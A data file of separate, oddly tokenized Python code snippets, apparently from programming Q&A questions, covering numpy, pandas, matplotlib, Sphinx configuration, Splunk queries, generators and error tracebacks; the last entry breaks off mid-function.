"obj = C.__new__ ( C , *args ) class ZeroResultSentinel ( object ) : instance = None def __new__ ( cls , *args ) : if not cls.instance : cls.instance = super ( ZeroResultSentinel , cls ) .__new__ ( cls , *args ) return cls.instance"
"parameter ( nx=720 , ny=360 , nday=365 ) c dimension tmax ( nx , ny , nday ) , nmax ( nx , ny , nday ) dimension tmin ( nx , ny , nday ) , nmin ( nx , ny , nday ) c open ( 10 , & file='FILE ' , & access='direct ' , recl=nx*ny*4 ) c do k=1 , nday read ( 10 , rec= ( k-1 ) *4+1 ) ( ( tmax ( i , j , k ) , i=1 , nx ) , j=1 , ny ) read ( 10 , rec= ( k-1 ) *4+2 ) ( ( nmax ( i , j , k ) , i=1 , nx ) , j=1 , ny ) read ( 10 , rec= ( k-1 ) *4+3 ) ( ( tmin ( i , j , k ) , i=1 , nx ) , j=1 , ny ) read ( 10 , rec= ( k-1 ) *4+4 ) ( ( nmin ( i , j , k ) , i=1 , nx ) , j=1 , ny ) end do options little_endiantitle global daily analysis ( grid box mean , the grid shown is the center of the grid box ) undef -999.0xdef 720 linear 0.25 0.50ydef 360 linear -89.75 0.50zdef 1 linear 1 1tdef 365 linear 01jan2015 1dyvars 4tmax 1 00 daily maximum temperature ( C ) nmax 1 00 number of reports for maximum temperature ( C ) tmin 1 00 daily minimum temperature ( C ) nmin 1 00 number of reports for minimum temperature ( C ) ENDVARS with gzip.open ( `` /FILE.gz '' , `` rb '' ) as infile : data = numpy.frombuffer ( infile.read ( ) , dtype=numpy.dtype ( ' < f4 ' ) , count = -1 ) while x < = len ( data ) / 4 : tmax.append ( data [ ( x-1 ) *4 ] ) tmin.append ( data [ ( x-1 ) *4 + 2 ] ) x += 1data_full = zip ( tmax , tmin ) # Define numpy variables and empty arraysnx = 720 # number of lonny = 360 # number of latnday = 0 # iterate up to 364 ( or 365 for leap year ) tmax = numpy.empty ( [ 0 ] , dtype= ' < f ' , order= ' F ' ) tmin = numpy.empty ( [ 0 ] , dtype= ' < f ' , order= ' F ' ) # Parse the data into numpy arrays , shifting records as the date incrementswhile nday < 365 : tmax = numpy.append ( tmax , data [ ( nx*ny ) *nday : ( nx*ny ) * ( nday + 1 ) ] .reshape ( ( nx , ny ) , order= ' F ' ) ) tmin = numpy.append ( tmin , data [ ( nx*ny ) * ( nday + 2 ) : ( nx*ny ) * ( nday + 3 ) ] .reshape ( ( nx , ny ) , order= ' F ' ) ) nday += 1"
"from matplotlib.backends.backend_agg import FigureCanvasAgg as FigureCanvasfrom matplotlib.figure import Figurefig = Figure ( ) can = FigureCanvas ( fig ) ax = fig.add_subplot ( 111 ) ax.plot ( ( 1,2,3 ) ) can.print_figure ( 'test ' )"
"import osimport numpyimport pygameos.environ [ 'SDL_VIDEODRIVER ' ] = 'dummy'pygame.display.init ( ) pygame.display.set_mode ( ( 1,1 ) , 0 , 32 ) dot_image = pygame.image.load ( 'dot.png ' ) .convert_alpha ( ) surf = pygame.Surface ( ( 100 , 100 ) , 0 , 32 ) surf.fill ( ( 255 , 255 , 255 ) ) surf = surf.convert_alpha ( ) for i in range ( 50 ) : surf.blit ( dot_image , ( 20 , 40 ) , None , pygame.BLEND_MULT ) for i in range ( 100 ) : surf.blit ( dot_image , ( 60 , 40 ) , None , pygame.BLEND_MULT ) pygame.image.save ( surf , 'result.png ' )"
type ( obj ) .__dict__ [ `` prop_name '' ] .fset is not None
"# . aaaa # . bbbb 1. b1 2. b2 # -- General configuration -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- autodoc_member_order = `` bysource '' # If your documentation needs a minimal Sphinx version , state it here. # needs_sphinx = ' 1.0 ' # Add any Sphinx extension module names here , as strings . They can be # extensions coming with Sphinx ( named 'sphinx.ext . * ' ) or your custom # ones.extensions = [ 'sphinx.ext.autodoc ' , 'sphinx.ext.doctest ' , 'sphinxjp.themes.basicstrap ' , 'sphinx.ext.pngmath ' ] # Add any paths that contain templates here , relative to this directory.templates_path = [ '_templates ' ] # The suffix of source filenames.source_suffix = '.rst ' # The encoding of source files. # source_encoding = 'utf-8-sig ' # The master toctree document.master_doc = 'index ' # General information about the project.project = CENSORED # The version info for the project you 're documenting , acts as replacement for # |version| and |release| , also used in various other places throughout the # built documents. # # The short X.Y version.version = ' 1 ' # The full version , including alpha/beta/rc tags.release = ' 1 ' # The language for content autogenerated by Sphinx . Refer to documentation # for a list of supported languages. # language = None # There are two options for replacing |today| : either , you set today to some # non-false value , then it is used : # today = `` # Else , today_fmt is used as the format for a strftime call. # today_fmt = ' % B % d , % Y ' # List of patterns , relative to source directory , that match files and # directories to ignore when looking for source files.exclude_patterns = [ ] # The reST default role ( used for this markup : ` text ` ) to use for all # documents. # default_role = None # If true , ' ( ) ' will be appended to : func : etc . cross-reference text. # add_function_parentheses = True # If true , the current module name will be prepended to all description # unit titles ( such as .. function : : ) . # add_module_names = True # If true , sectionauthor and moduleauthor directives will be shown in the # output . They are ignored by default. # show_authors = False # The name of the Pygments ( syntax highlighting ) style to use.pygments_style = 'sphinx ' # A list of ignored prefixes for module index sorting. # modindex_common_prefix = [ ] # If true , keep warnings as `` system message '' paragraphs in the built documents. # keep_warnings = False # -- Options for HTML output -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # The theme to use for HTML and HTML Help pages . See the documentation for # a list of builtin themes. # html_theme = 'sphinx_rtd_theme'html_theme = 'basicstrap ' # Theme options are theme-specific and customize the look and feel of a theme # further . For a list of options available for each theme , see the # documentation. # Add any paths that contain custom themes here , relative to this directory. # html_theme_path = [ sphinx_rtd_theme.get_html_theme_path ( ) ] html_theme_options = { 'content_fixed ' : True , 'content_width ' : 6 , # Disable showing the sidebar . Defaults to 'false ' # 'nosidebar ' : True , # Show header searchbox . Defaults to false . works only `` nosidber=True '' , # 'header_searchbox ' : True , 'header_inverse ' : False , 'relbar_inverse ' : False , 'inner_theme ' : True , 'inner_theme_name ' : 'bootswatch-cerulean ' , } # The name for this set of Sphinx documents . If None , it defaults to # `` < project > v < release > documentation '' . # html_title = None # A shorter title for the navigatiotn bar . Default is the same as html_title. # html_short_title = None # The name of an image file ( relative to this directory ) to place at the top # of the sidebar. # html_logo = None # The name of an image file ( within the static path ) to use as favicon of the # docs . This file should be a Windows icon file ( .ico ) being 16x16 or 32x32 # pixels large. # html_favicon = None # Add any paths that contain custom static files ( such as style sheets ) here , # relative to this directory . They are copied after the builtin static files , # so a file named `` default.css '' will overwrite the builtin `` default.css '' .html_static_path = [ '_static ' ] # Add any extra paths that contain custom files ( such as robots.txt or # .htaccess ) here , relative to this directory . These files are copied # directly to the root of the documentation. # html_extra_path = [ ] # If not `` , a 'Last updated on : ' timestamp is inserted at every page bottom , # using the given strftime format. # html_last_updated_fmt = ' % b % d , % Y ' # If true , SmartyPants will be used to convert quotes and dashes to # typographically correct entities. # html_use_smartypants = True # Custom sidebar templates , maps document names to template names. # html_sidebars = { } # Additional templates that should be rendered to pages , maps page names to # template names. # html_additional_pages = { } # If false , no module index is generated. # html_domain_indices = True # If false , no index is generated. # html_use_index = True # If true , the index is split into individual pages for each letter. # html_split_index = False # If true , links to the reST sources are added to the pages. # html_show_sourcelink = True # If true , `` Created using Sphinx '' is shown in the HTML footer . Default is True. # html_show_sphinx = True # If true , `` ( C ) Copyright ... '' is shown in the HTML footer . Default is True. # html_show_copyright = True # If true , an OpenSearch description file will be output , and all pages will # contain a < link > tag referring to it . The value of this option must be the # base URL from which the finished HTML is served. # html_use_opensearch = `` # This is the file name suffix for HTML files ( e.g . `` .xhtml '' ) . # html_file_suffix = None # Output file base name for HTML help builder.htmlhelp_basename = CENSORED # -- Options for LaTeX output -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -latex_elements = { # The paper size ( 'letterpaper ' or 'a4paper ' ) . # 'papersize ' : 'letterpaper ' , # The font size ( '10pt ' , '11pt ' or '12pt ' ) . # 'pointsize ' : '10pt ' , # Additional stuff for the LaTeX preamble . 'preamble ' : '\setcounter { tocdepth } { 2 } ' , # 'figure_align ' : ' h ' , } # Grouping the document tree into LaTeX files . List of tuples # ( source start file , target name , title , # author , documentclass [ howto , manual , or own class ] ) .latex_documents = [ ( CENSORED ) , ] # The name of an image file ( relative to this directory ) to place at the top of # the title page.latex_logo = `` ../../images/other/CENSORED '' # For `` manual '' documents , if this is true , then toplevel headings are parts , # not chapters. # latex_use_parts = False # If true , show page references after internal links.latex_show_pagerefs = True # If true , show URL addresses after external links. # latex_show_urls = False # Documents to append as an appendix to all manuals. # latex_appendices = [ ] # If false , no module index is generated.latex_domain_indices = False # -- Options for manual page output -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - # One entry per manual page . List of tuples # ( source start file , name , description , authors , manual section ) .man_pages = [ CENSORED ] # If true , show URL addresses after external links. # man_show_urls = False # -- Options for Texinfo output -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - # Grouping the document tree into Texinfo files . List of tuples # ( source start file , target name , title , author , # dir menu entry , description , category ) texinfo_documents = [ ( CENSORED ) , ] # Documents to append as an appendix to all manuals. # texinfo_appendices = [ ] # If false , no module index is generated. # texinfo_domain_indices = True # How to display URL addresses : 'footnote ' , 'no ' , or 'inline'. # texinfo_show_urls = 'footnote ' # If true , do not generate a @ detailmenu in the `` Top '' node 's menu. # texinfo_no_detailmenu = False # Example configuration for intersphinx : refer to the Python standard library.intersphinx_mapping = { 'http : //docs.python.org/ ' : None }"
"previous = previous.pointer = Node ( item , None ) previous.pointer = Node ( item , None ) previous = previous.pointer"
"# purpose of script : To connect to Splunk , execute a query , and write the query results out to an excel file. # query results = multiple dynamic # of rows . 7 columns . # ! /usr/bin/env pythonimport splunklib.client as client # splunklib.client class is used to connect to splunk , authenticate , and maintain sessionimport splunklib.results as results # module for returning results and printing/writing them outlistOfAppIDs = [ ] # open file to read each line and add each line in file to an array . These are our appID 's to searchwith open ( 'filelocation.txt ' , ' r ' ) as fi : for line in fi : listOfAppIDs.append ( line.rstrip ( '\n ' ) ) print listOfAppIDs # identify variables used to log inHOST = `` 8.8.8.8 '' PORT = 8089USERNAME = `` uName '' PASSWORD = `` pWord '' startPoint = `` appID1 '' # initial start point in arrayoutputCsv = open ( 'filelocation.csv ' , 'wb ' ) fieldnames = [ 'Application ID ' , 'transport ' , 'dst_port ' , 'Average Throughput per Month ' , 'Total Sessions Allowed ' , 'Unique Source IPs ' , 'Unique Destination IPs ' ] writer = csv.DictWriter ( outputCsv , fieldnames=fieldnames ) writer.writeheader ( ) ; def connect ( ) : global startPoint , item print `` startPoint : `` + startPoint # Create a service instance by using the connect function and log in service = client.connect ( host=HOST , port=PORT , username=USERNAME , password=PASSWORD , autologin=True ) jobs = service.jobs # Get the collection of jobs/searches kwargs_blockingsearch = { `` exec_mode '' : `` normal '' } try : for item in listOfAppIDs : errorCount=0 print `` item : `` + item if ( item > = startPoint ) : searchquery_blocking = `` search splunkQery '' print item + ' : ' job = jobs.create ( searchquery_blocking , **kwargs_blockingsearch ) # A blocking search returns query result . Search executes here print `` Splunk query for appID `` , item , `` completed ! \n '' resultCount = job [ `` resultCount '' ] # number of results this job ( splunk query ) returned print `` result count `` , resultCount rr = results.ResultsReader ( job.results ( ) ) for result in rr : if isinstance ( result , results.Message ) : # Diagnostic messages may be returned in the results # Check the type and do something . if result.type == log_type : print ' % s : % s ' % ( result.type , result.message ) errorCount+=1 elif isinstance ( result , dict ) : # Normal events are returned as dicts # Do something with them if required . print result writer.writerow ( [ result + errorCount ] ) pass assert rr.is_preview == False except : print `` \nexcept\n '' startPoint = item # returh to connect function but start where startPoint is at in array connect ( ) print `` done ! '' connect ( )"
"{ % for code , name in charts.items % } < option value= '' { { code } } '' > { { name } } < /option > { % endfor % } class GenerateChart ( basewebview ) : def get ( self ) : values = { `` datepicker '' : True } values [ `` charts '' ] = { `` p3 '' : `` 3D Pie Chart '' , `` p '' : `` Segmented Pied Chart '' } self.render_page ( `` generatechart.html '' , values ) class basewebview ( webapp.RequestHandler ) : `` ' Base class for all webapp.RequestHandler type classes `` ' def render_page ( self , filename , template_values=dict ( ) ) : filename = `` % s/ % s '' % ( _template_dir , filename ) path = os.path.join ( os.path.dirname ( __file__ ) , filename ) self.response.out.write ( template.render ( path , template_values ) )"
"import numpy as npimport sympy as spdef numpy_function ( ) : x , y , z = np.mgrid [ 0:1:40*1j , 0:1:40*1j , 0:1:40*1j ] T = ( 1 - np.cos ( 2*np.pi*x ) ) * ( 1 - np.cos ( 2*np.pi*y ) ) *np.sin ( np.pi*z ) *0.1 return Tdef sympy_function ( ) : x , y , z = sp.Symbol ( `` x '' ) , sp.Symbol ( `` y '' ) , sp.Symbol ( `` z '' ) T = ( 1 - sp.cos ( 2*sp.pi*x ) ) * ( 1 - sp.cos ( 2*sp.pi*y ) ) *sp.sin ( sp.pi*z ) *0.1 lambda_function = np.vectorize ( sp.lambdify ( ( x , y , z ) , T , `` numpy '' ) ) x , y , z = np.mgrid [ 0:1:40*1j , 0:1:40*1j , 0:1:40*1j ] T = lambda_function ( x , y , z ) return T In [ 3 ] : timeit test.numpy_function ( ) 100 loops , best of 3 : 11.9 ms per loop In [ 4 ] : timeit test.sympy_function ( ) 1 loops , best of 3 : 634 ms per loop In [ 35 ] : y = np.arange ( 10 ) In [ 36 ] : f = sp.lambdify ( x , sin ( x ) , '' numpy '' ) In [ 37 ] : f ( y ) Out [ 37 ] : array ( [ 0. , 0.84147098 , 0.90929743 , 0.14112001 , -0.7568025 , -0.95892427 , -0.2794155 , 0.6569866 , 0.98935825 , 0.41211849 ] ) In [ 38 ] : y = np.arange ( 10 ) In [ 39 ] : f = sp.lambdify ( x,1 , '' numpy '' ) In [ 40 ] : f ( y ) Out [ 40 ] : 1"
"df = { 'player ' : [ ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' a ' , ' b ' , ' b ' , ' b ' , ' b ' , ' b ' , ' b ' , ' b ' , ' b ' , ' b ' , ' c ' , ' c ' , ' c ' , ' c ' , ' c ' , ' c ' , ' c ' , ' c ' , ' c ' ] , 'week ' : [ ' 1 ' , ' 1 ' , ' 1 ' , ' 2 ' , ' 2 ' , ' 2 ' , ' 3 ' , ' 3 ' , ' 3 ' , ' 1 ' , ' 1 ' , ' 1 ' , ' 2 ' , ' 2 ' , ' 2 ' , ' 3 ' , ' 3 ' , ' 3 ' , ' 1 ' , ' 1 ' , ' 1 ' , ' 2 ' , ' 2 ' , ' 2 ' , ' 3 ' , ' 3 ' , ' 3 ' ] , 'category ' : [ 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' , 'RES ' , 'VIT ' , 'MATCH ' ] , 'energy ' : [ 75,54,87,65,24,82,65,42,35,25,45,87,98,54,82,75,54,87,65,24,82,65,42,35,25,45,98 ] } df = pd.DataFrame ( data= df ) df = df [ [ 'player ' , 'week ' , 'category ' , 'energy ' ] ] df = df.set_index ( [ 'player ' , 'week ' ] ) for index , row in df1.iterrows ( ) : group = df1.ix [ df1 [ 'energy ' ] .idxmax ( ) ] category energy player week b 2 RES 98 2 VIT 54 2 MATCH 82 df.groupby ( [ 'player ' , 'week ' ] ) [ 'energy ' ] .max ( ) .groupby ( level= [ 'player ' , 'week ' ] ) energy category player week a 1 87 VIT 2 82 VIT 3 65 VIT b 1 87 VIT 2 98 VIT 3 87 VIT c 1 82 VIT 2 65 VIT 3 98 VIT"
"> > > random.seed ( 1234 ) > > > a = random.rand ( 4,4 ) > > > print a [ [ 0.19151945 0.62210877 0.43772774 0.78535858 ] [ 0.77997581 0.27259261 0.27646426 0.80187218 ] [ 0.95813935 0.87593263 0.35781727 0.50099513 ] [ 0.68346294 0.71270203 0.37025075 0.56119619 ] ] > > > b = array ( [ 1,0,2,1 ] ) > > > c = array ( [ 3,2,4,4 ] ) > > > d = empty ( 4 ) > > > for i in xrange ( 4 ) : d [ i ] = sum ( a [ i , b [ i ] : c [ i ] ] ) > > > print d [ 1.05983651 1.05256841 0.8588124 1.64414897 ]"
"class _static_property ( object ) : `` ' Descriptor class used for declaring computed properties that do n't require a class instance. `` ' def __init__ ( self , getter , setter ) : self.getter = getter self.setter = setter def __get__ ( self , instance , owner ) : print `` In the Get function '' return self.getter.__get__ ( owner ) ( ) def __set__ ( self , instance , value ) : print `` In setter function '' self.setter.__get__ ( ) ( value ) class MyTest ( object ) : _x = 42 @ staticmethod def getX ( ) : return MyTest._x @ staticmethod def setX ( v ) : MyTest._x = v X = _static_property ( getX , setX ) print MyTest.__dict__print MyTest.XMyTest.X = 12print MyTest.Xprint MyTest.__dict__"
"a = [ 1,2,3 ] b = [ 1,2,3 ] x , y = get_values_from_somewhere ( ) try : a [ x ] = b [ y ] except IndexError as e : ... ."
"class DnsQuery ( webapp2.RequestHandler ) : def get ( self ) : domain = self.request.get ( 'domain ' ) logging.info ( `` Test Query for `` +domain ) answers = dns.resolver.query ( domain , 'TXT ' , tcp=True ) logging.info ( `` DNS OK '' ) for rdata in answers : rc = str ( rdata.exchange ) .lower ( ) logging.info ( `` Record `` +rc ) File `` /base/data/home/apps/s~/one.366576281491296772/main.py '' , line 37 , in post return self.get ( ) File `` /base/data/home/apps/s~/one.366576281491296772/main.py '' , line 41 , in get answers = dns.resolver.query ( domain , 'TXT ' , tcp=True ) File `` /base/data/home/apps/s~/one.366576281491296772/dns/resolver.py '' , line 976 , in query raise_on_no_answer , source_port ) File `` /base/data/home/apps/s~/one.366576281491296772/dns/resolver.py '' , line 821 , in query timeout = self._compute_timeout ( start ) File `` /base/data/home/apps/s~/one.366576281491296772/dns/resolver.py '' , line 735 , in _compute_timeout raise Timeout"
def gen_func ( ) : yield 1 yield 2gen = gen_func ( ) next ( gen ) next ( gen ) next ( gen ) # StopIteration as expectednext ( gen ) # why StopIteration and not something to warn me that I 'm doing something wrong def do_work ( gen ) : for x in gen : # do stuff with x pass # here I forgot that I already used up gen # so the loop does nothing without raising any exception or warning for x in gen : # do stuff with x passdef gen_func ( ) : yield 1 yield 2gen = gen_func ( ) do_work ( gen )
"C : \Users\userz > glpsolGLPSOL : GLPK LP/MIP Solver , v4.64No input problem file specified ; try glpsol -- help python -m pip install cvxopt import cvxopt.glpk import cvxopt.glpkImportError : No module named glpk"
"def onReady ( f : Callable [ [ ] , Any ] ) - > None : ... def checkIfReady ( f : Callable [ [ ] , Bool ] ) - > None : ... Action [ A ] = Callable [ [ ] , A ] def onReady ( f : Action [ Any ] ) - > None : ... ActionBool = Callable [ [ ] , bool ]"
src = { i : i ** 3 for i in range ( 1000000 ) } # Taking items 1 by 1 ( ~0.0059s ) dst = { } while len ( dst ) < 20000 : item = src.popitem ( ) dst [ item [ 0 ] ] = item [ 1 ]
"list_dirs = ( ' C : \\foo\\bar\\hello.txt ' , ' C : \\bar\\foo\\.world.txt ' , ' C : \\foo\\bar\\yellow.txt ' ) unwanted_files = ( 'hello.txt ' , 'yellow.txt ) list_dirs = ( C : \\bar\\foo\.world.txt ' ) for i in arange ( 0 , len ( list_dirs ) ) : if 'hello.txt ' in list_dirs [ i ] : list_dirs.remove ( list_dirs [ i ] )"
"class OverrideTests ( object ) : def __init__ ( self ) : self.override = 0 def __enter__ ( self ) : self.override += 1 # noinspection PyUnusedLocal def __exit__ ( self , exc_type , exc_val , exc_tb ) : self.override -= 1 assert not self.override < 0 @ property def overriding ( self ) : return self.override > 0override_tests = OverrideTests ( ) with override_tests : do stuff ... def stat ( k , expected ) : x = ' . ' if override_tests.overriding == expected else '* ' sys.stdout.write ( ' { 0 } { 1 } '.format ( k , x ) ) def do_it_inner ( ) : with override_tests : stat ( 2 , True ) stat ( 3 , True ) # outer with context makes this truedef do_it ( ) : with override_tests : stat ( 1 , True ) do_it_inner ( ) stat ( 4 , False ) def do_it_lots ( ntimes=10 ) : for i in range ( ntimes ) : thread.start_new_thread ( do_it , ( ) )"
# WELCOME ! This library is helpful and will help you in _many_ ways ! For example : `` ` > > > import library > > > library.helps ( ) True `` `
"level_0 A B C level_1 P P P level_2 x y x y x y0 -1.027155 0.667489 0.314387 -0.428607 1.277167 -1.3287711 0.223407 -1.713410 0.480903 -3.517518 -1.412756 0.718804 required_columns = [ ' A ' , ' B ' ] required_level = 'level_0 ' print df.select ( lambda x : x [ 0 ] in required_columns , axis=1 ) print df.xs ( ' A ' , level=required_level , axis=1 ) print df.ix [ : , df.columns.get_level_values ( required_level ) .isin ( required_columns ) ] import pandas as pdimport numpy as npheader = pd.MultiIndex.from_product ( [ [ ' A ' , ' B ' , ' C ' ] , [ ' P ' ] , [ ' x ' , ' y ' ] ] , names= [ 'level_0 ' , 'level_1 ' , 'level_2 ' ] ) df = pd.DataFrame ( np.random.randn ( 2 , 6 ) , columns=header ) required_columns = [ ' A ' , ' B ' ] required_level = 'level_0'print dfprint df.select ( lambda x : x [ 0 ] in required_columns , axis=1 ) print df.xs ( ' A ' , level=required_level , axis=1 ) print df.ix [ : , df.columns.get_level_values ( required_level ) .isin ( required_columns ) ]"
salt '* ' git.fetch cwd=/var/git/myproject opts= ' -- all ' user=gitsalt '* ' git.pull cwd=/var/git/myproject opts='origin master'salt '* ' nginx.signal reload
"from BeautifulSoup import BeautifulSoup as doc_parserreader = open ( options.input_file , `` rb '' ) doc = doc_parser ( reader ) Traceback ( most recent call last ) : File `` ./grablinks '' , line 101 , in < module > sys.exit ( main ( ) ) File `` ./grablinks '' , line 88 , in main links = grab_links ( options ) File `` ./grablinks '' , line 36 , in grab_links doc = doc_parser ( reader ) File `` /usr/local/lib/python2.7/dist-packages/BeautifulSoup.py '' , line 1519 , in __init__ BeautifulStoneSoup.__init__ ( self , *args , **kwargs ) File `` /usr/local/lib/python2.7/dist-packages/BeautifulSoup.py '' , line 1144 , in __init__ self._feed ( isHTML=isHTML ) File `` /usr/local/lib/python2.7/dist-packages/BeautifulSoup.py '' , line 1186 , in _feed SGMLParser.feed ( self , markup ) File `` /usr/lib/python2.7/sgmllib.py '' , line 104 , in feed self.goahead ( 0 ) File `` /usr/lib/python2.7/sgmllib.py '' , line 143 , in goahead k = self.parse_endtag ( i ) File `` /usr/lib/python2.7/sgmllib.py '' , line 320 , in parse_endtag self.finish_endtag ( tag ) File `` /usr/lib/python2.7/sgmllib.py '' , line 358 , in finish_endtag method = getattr ( self , 'end_ ' + tag ) UnicodeEncodeError : 'ascii ' codec ca n't encode characters in position 15-16 : ordinal not in range ( 128 )"
http : //www.someAPItestingtool.com/status/405
"import hypothesis.strategies as stfrom hypothesis import assume , given @ given ( st.lists ( ints , min_size=1 ) , st.lists ( ints , min_size=1 ) , ) def test_my_func ( x , y ) : assume ( len ( x ) == len ( y ) ) # Assertions"
"> > > import decimal > > > decimal.Decimal ( 1000 ) / 10Decimal ( `` 100 '' ) > > > import decimal > > > decimal.Decimal ( 1000 ) / 10Decimal ( ' 0.00000-6930898827444486144 ' ) > > > decimal.Decimal ( ' 0.00000-6930898827444486144 ' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/decimal.py '' , line 548 , in __new__ `` Invalid literal for Decimal : % r '' % value ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/decimal.py '' , line 3844 , in _raise_error raise error ( explanation ) decimal.InvalidOperation : Invalid literal for Decimal : ' 0.00000-6930898827444486144 ' > > > decimal.Decimal ( `` 1000.000 '' ) / decimal.Decimal ( `` 10.000 '' ) Decimal ( ' 0.00000-6930898827444486144 ' ) > > > decimal.Decimal ( `` 1000.000 '' ) / decimal.Decimal ( `` 10 '' ) Decimal ( ' 0.000200376420520689664 ' )"
"books = [ book_1 , book_2 , book_3 ] for b in books : print ( `` Thank you for using our Library ! You have decided to borrow % s on % s . Please remember to return the book in % d calendar days on % s '' % ( book.title , book.start_date , book.lend_duration , book.return_date '' ) )"
"> > > data = [ ( ' a',1 ) , ( ' b',3 ) , ( ' a',4 ) , ( ' c',9 ) , ( ' b',1 ) , ( 'd',3 ) ] > > > res = { } > > > for tup in data : ... res [ tup [ 0 ] ] = res.setdefault ( tup [ 0 ] ,0 ) + tup [ 1 ] ... > > > res { ' a ' : 5 , ' c ' : 9 , ' b ' : 4 , 'd ' : 3 } { tup [ 0 ] : SELF_REFERENCE.setdefault ( tup [ 0 ] ,0 ) + tup [ 1 ] for tup in data }"
"src/ __init__.py a.pyb.py TESTVALUE = 5 from src import aprint ( a.TESTVALUE ) Traceback ( most recent call last ) : File `` b.py '' , line 5 , in < module > from src import aImportError : No module named src"
"Traceback ( most recent call last ) : File `` /Users/mbostwick/google-cloud-sdk/bin/remote_api_shell.py '' , line 133 , in < module > run_file ( __file__ , globals ( ) ) File `` /Users/mbostwick/google-cloud-sdk/bin/remote_api_shell.py '' , line 129 , in run_file execfile ( _PATHS.script_file ( script_name ) , globals_ ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/tools/remote_api_shell.py '' , line 160 , in < module > main ( sys.argv ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/tools/remote_api_shell.py '' , line 156 , in main oauth2=True ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/tools/remote_api_shell.py '' , line 74 , in remote_api_shell secure=secure , app_id=appid ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/ext/remote_api/remote_api_stub.py '' , line 769 , in ConfigureRemoteApiForOAuth rpc_server_factory=rpc_server_factory ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/ext/remote_api/remote_api_stub.py '' , line 839 , in ConfigureRemoteApi app_id = GetRemoteAppIdFromServer ( server , path , rtok ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/ext/remote_api/remote_api_stub.py '' , line 569 , in GetRemoteAppIdFromServer response = server.Send ( path , payload=None , **urlargs ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/tools/appengine_rpc_httplib2.py '' , line 259 , in Send NeedAuth ( ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/tools/appengine_rpc_httplib2.py '' , line 235 , in NeedAuth RaiseHttpError ( url , response_info , response , 'Too many auth attempts . ' ) File `` /Users/mbostwick/google-cloud-sdk/platform/google_appengine/google/appengine/tools/appengine_rpc_httplib2.py '' , line 85 , in RaiseHttpError raise urllib2.HTTPError ( url , response_info.status , msg , response_info , stream ) urllib2.HTTPError : HTTP Error 401 : Unauthorized Too many auth attempts ."
"def flatten_dir ( dirname ) : `` 'Flattens a given root directory by moving all files from its sub-directories and nested sub-directories into the root directory and then deletes all sub-directories and nested sub-directories . Creates a backup directory preserving the original structure of the root directory and restores this in case of errors. `` ' RESTORE_BACKUP = False log.info ( 'processing directory `` % s '' ' % dirname ) backup_dirname = str ( uuid.uuid4 ( ) ) try : shutil.copytree ( dirname , backup_dirname ) log.debug ( 'directory `` % s '' backed up as directory `` % s '' ' % ( dirname , backup_dirname ) ) except shutil.Error : log.error ( 'shutil.Error : Error while trying to back up the directory ' ) sys.stderr.write ( 'the program is terminating with an error\n ' ) sys.stderr.write ( 'press consult the log file\n ' ) sys.stderr.flush ( ) time.sleep ( 0.25 ) print 'Press any key to quit this program . ' msvcrt.getch ( ) sys.exit ( ) for root , dirs , files in os.walk ( dirname , topdown=False ) : log.debug ( 'os.walk passing : ( % s , % s , % s ) ' % ( root , dirs , files ) ) if root ! = dirname : for file in files : full_filename = os.path.join ( root , file ) try : shutil.move ( full_filename , dirname ) log.debug ( ' '' % s '' copied to directory `` % s '' ' % ( file , dirname ) ) except shutil.Error : RESTORE_BACKUP = True log.error ( 'file `` % s '' could not be copied to directory `` % s '' ' % ( file , dirname ) ) log.error ( 'flagging directory `` % s '' for reset ' % dirname ) if not RESTORE_BACKUP : try : shutil.rmtree ( root ) log.debug ( 'directory `` % s '' deleted ' % root ) except shutil.Error : RESTORE_BACKUP = True log.error ( 'directory `` % s '' could not be deleted ' % root ) log.error ( 'flagging directory `` % s '' for reset ' % dirname ) if RESTORE_BACKUP : break if RESTORE_BACKUP : RESTORE_FAIL = False try : shutil.rmtree ( dirname ) except shutil.Error : log.error ( 'modified directory `` % s '' could not be deleted ' % dirname ) log.error ( 'manual restoration from backup directory `` % s '' necessary ' % backup_dirname ) RESTORE_FAIL = True if not RESTORE_FAIL : try : os.renames ( backup_dirname , dirname ) log.debug ( 'back up of directory `` % s '' restored ' % dirname ) print ' > ' print ' > ******WARNING****** ' print ' > There was an error while trying to flatten directory `` % s '' ' % dirname print ' > back up of directory `` % s '' restored ' % dirname print ' > ******WARNING****** ' print ' > ' except WindowsError : log.error ( 'backup directory `` % s '' could not be renamed to original directory name ' % backup_dirname ) log.error ( 'manual renaming of backup directory `` % s '' to original directory name `` % s '' necessary ' % ( backup_dirname , dirname ) ) print ' > ' print ' > ******WARNING****** ' print ' > There was an error while trying to flatten directory `` % s '' ' % dirname print ' > back up of directory `` % s '' was NOT restored successfully ' % dirname print ' > no information is lost ' print ' > check the log file for information on manually restoring the directory ' print ' > ******WARNING****** ' print ' > ' else : try : shutil.rmtree ( backup_dirname ) log.debug ( 'back up of directory `` % s '' deleted ' % dirname ) log.info ( 'directory `` % s '' successfully processed ' % dirname ) print ' > directory `` % s '' successfully processed ' % dirname except shutil.Error : log.error ( 'backup directory `` % s 